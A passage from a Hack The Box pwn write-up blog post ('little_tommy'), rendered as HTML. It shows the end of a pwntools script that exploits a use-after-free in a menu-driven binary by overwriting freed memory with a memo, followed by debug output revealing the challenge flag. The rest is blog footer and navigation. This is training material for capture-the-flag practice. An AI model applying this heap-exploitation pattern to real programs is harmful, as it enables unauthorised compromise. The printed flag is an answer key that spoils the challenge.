class="string">&quot;luci&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recvline(<span class="string">&quot;Please enter an operation number:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvline(<span class="string">&quot;Account deleted successfully&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recvline(<span class="string">&quot;Please enter an operation number:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recvline(<span class="string">&quot;Please enter memo:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfuck&quot;</span>)</span><br><span class="line">p.recvline(<span class="string">&quot;Thank you, please keep this reference number number safe:&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recvline(<span class="string">&quot;Please enter an operation number:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Please enter an operation number: [DEBUG] Received 0x3 bytes:</span><br><span class="line">    <span class="string">&#x27;5\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">[DEBUG] Received 0x9e bytes:</span><br><span class="line">    <span class="string">&#x27;HTB&#123;I_am_so_heaped_up_right_now&#125;\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Create account\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Display account\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Delete account\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Add memo\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Print flag\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Please enter an operation number: &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/little_tommy9.jpg"></li>
+</ul>
+<h2 id="摘自-致敬原作-……"><a href="#摘自-致敬原作-……" class="headerlink" title="摘自(致敬原作)……"></a>摘自(致敬原作)……</h2><ul>
+<li>浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。</li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9rYXJvbC1tYXp1cmVrOTUubWVkaXVtLmNvbS9wd24tbGl0dGxlLXRvbW15LWNoYWxsZW5nZS1odGItNDYwMTYxMDRmMDlm">PWN Little Tommy challenge - HTB<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/09/09/little-tommy/" title="Hack-The-Box-pwn-challenge[little_tommy]">https://fdlucifer.github.io/2021/09/09/little-tommy/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/09/09/what-dose-the-f-say/" rel="prev" title="Hack-The-Box-pwn-challenge[what_dose_the_f_say]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-pwn-challenge[what_dose_the_f_say]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/09/13/forge/" rel="next" title="Hack-The-Box-walkthrough[forge]">
+                  Hack-The-Box-walkthrough[forge] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
